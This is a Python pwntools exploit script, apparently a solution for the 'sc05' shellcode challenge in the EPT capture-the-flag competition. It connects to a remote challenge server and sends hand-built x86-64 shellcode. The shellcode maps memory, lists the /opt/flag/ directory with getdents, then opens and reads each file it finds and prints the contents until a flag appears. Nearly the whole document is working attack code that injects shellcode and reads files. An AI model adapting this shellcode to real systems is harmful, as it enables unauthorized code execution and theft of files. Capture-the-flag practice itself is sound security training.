#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./sc05')
# context.terminal = ['tmux', 'splitw', '-h']
host = args.HOST or 'io.ept.gg'
port = int(args.PORT or 31353)
context.terminal = ['tmux', 'splitw', '-h']
def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)
def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io
def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)
gdbscript = '''
b *runShellcode+25
continue
'''.format(**locals())
shellcode = ''
shellcode += shellcraft.syscall('SYS_mmap', 0x1336000, 0x1000,'PROT_READ | PROT_WRITE | PROT_EXEC','MAP_PRIVATE | MAP_ANONYMOUS',-1, 0)
shellcode += shellcraft.pushstr('/opt/flag/')
shellcode += """
mov rax, 0x1336000;
mov rbx, [rsp];
mov [rax], rbx;
add rax, 8;
xor rbx, rbx;
mov ebx, [rsp+8];
mov [rax], rbx;"""
shellcode += shellcraft.syscall('SYS_openat', -100,'rsp', 0x90800 )
shellcode += """
mov r13, rax;
"""
shellcode += shellcraft.syscall('SYS_mmap', 0x1337000, 0x3000,'PROT_READ | PROT_WRITE | PROT_EXEC','MAP_PRIVATE | MAP_ANONYMOUS',-1, 0)
shellcode += shellcraft.syscall('SYS_getdents', 'r13',0x1337000, 0x8000)
#shellcode += shellcraft.syscall('SYS_close', 'r13') - debugging
shellcode += """
xor r12, r12;
mov r15, 0x1337022;
loop: 
mov rdx, 0x133600a;
mov rbx, [r15];
mov [rdx], rbx;
add r15, 0x20"""
shellcode += shellcraft.syscall('SYS_open', 0x1336000, 0, 0)
shellcode += """
mov r13, rax;
"""
shellcode += shellcraft.syscall('SYS_read', 'r13', 0x1336200, 201)
shellcode += shellcraft.syscall('SYS_write', 1, 0x1336200, 201)
shellcode += shellcraft.syscall('SYS_close', 'r13')
shellcode += """
inc r12;
cmp r12, 200;
jle loop;
"""
kek = asm(shellcode)
# -- Exploit goes here --
io = start()
io.recvuntil('>')
#kek = asm(shellcraft.sh())
io.sendline(kek)
while True:
    data = io.recvline()
    if b'EPT{' in data:
        idx = data.index(b'}')
        print(data[:idx+1])
        exit(1)
io.interactive()